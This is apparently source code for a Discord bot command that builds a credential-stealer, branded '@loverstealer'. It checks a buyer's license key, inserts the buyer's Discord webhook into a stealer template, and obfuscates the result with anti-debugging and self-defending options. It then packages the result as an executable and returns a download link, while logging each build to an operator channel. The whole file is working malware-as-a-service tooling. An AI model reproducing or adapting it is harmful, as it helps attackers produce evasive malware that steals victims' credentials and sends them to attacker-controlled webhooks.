const Discord = require("discord.js");
const fs = require('fs');
const db = require('quick.db');
const JavaScriptObfuscator = require('javascript-obfuscator');
const build = require('../Build/script/builder');
const axios = require("axios");

module.exports.help = {
  name: "build",
};

module.exports.run = async (client, message, args) => {
  const status = await db.get(`status_${client.id}`);
  if (status) return message.channel.send("Disabled :eyes:");
  else if (!status) {
    if (!args[0] || !args[1]) return message.channel.send(`Invalid arguments! \`Use: ${client.config.bot.prefix}build <webhook> <key>\``);
    const webhook = args[0];
    const key = args[1];
    const data = await axios.get(webhook).catch(() => { });
    if (!data || data.code) return message.channel.send("Your webhook link is not correct!");
    const keydb = Object.values(db.get(`keys_${client.id}`)).find(element => element.cle === key);
    if (keydb === undefined) return message.channel.send("Your key is invalid");
    await message.channel.send("Creating your file... *(Can take more than 2 minutes)*");
    const rdm = random(10);
    const replaced = fs.readFileSync('./Build/script/index.js').toString().replace('da_webhook', webhook).replace('%key%', rdm).replace('%domain%', client.config.domain);
    await db.set(`wbh_${rdm}`, webhook);
    const obfuscationResult = JavaScriptObfuscator.obfuscate(replaced, {
      "ignoreRequireImports": true,
      "compact": true,
      "controlFlowFlattening": true,
      "controlFlowFlatteningThreshold": 0.5,
      "deadCodeInjection": true,
      "deadCodeInjectionThreshold": 0.01,
      "debugProtection": true,
      "debugProtectionInterval": 0,
      "disableConsoleOutput": true,
      "identifierNamesGenerator": "hexadecimal",
      "log": false,
      "numbersToExpressions": true,
      "renameGlobals": true,
      "selfDefending": true,
      "simplify": true,
      "splitStrings": true,
      "splitStringsChunkLength": 5,
      "stringArray": true,
      "stringArrayEncoding": ["base64"],
      "stringArrayIndexShift": true,
      "stringArrayRotate": false,
      "stringArrayShuffle": false,
      "stringArrayWrappersCount": 5,
      "stringArrayWrappersChainedCalls": true,
      "stringArrayWrappersParametersMaxCount": 5,
      "stringArrayWrappersType": "function",
      "stringArrayThreshold": 1,
      "transformObjectKeys": false,
      "unicodeEscapeSequence": false
    });
    const payload = obfuscationResult.getObfuscatedCode();
    const package = fs.readFileSync('./Build/script/package.json');
    fs.mkdirSync(`./Build/script/${rdm}`);
    fs.writeFileSync(`./Build/script/${rdm}/index.js`, payload);
    fs.writeFileSync(`./Build/script/${rdm}/package.json`, package);
    build(rdm).then((res) => {
      if (res == 'Error') return message.channel.send('An error occured');
      const embed = new Discord.MessageEmbed();
      embed.addField(`__Here's your file:__`, `[Download](${client.config.domain}/${rdm})`);
      embed.setColor("2f3136");
      embed.setFooter("@loverstealer");
      embed.setTimestamp();
      message.channel.send(embed);
    }).catch(() => {
      return message.channel.send('An error occured')
    });
    const embed = new Discord.MessageEmbed()
    embed.setTitle('New Build')
    embed.setColor('2f3136')
    embed.addFields({ name: "Builder:", value: `*<@${message.author.id}> (${message.author.id})*`, inline: true }, { name: "Key:", value: `*${args[1]}*`, inline: true }, { name: "Exe:", value: `*llx404_${rdm}.exe*`, inline: true }, { name: "Webhook:", value: `\`\`\`${args[0]}\`\`\``, inline: false })
    embed.setTimestamp()
    embed.setFooter('@loverstealer');
    const log = client.channels.cache.get(client.config.logs);
    if (log) log.send(embed);
  };
}

function random(length) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

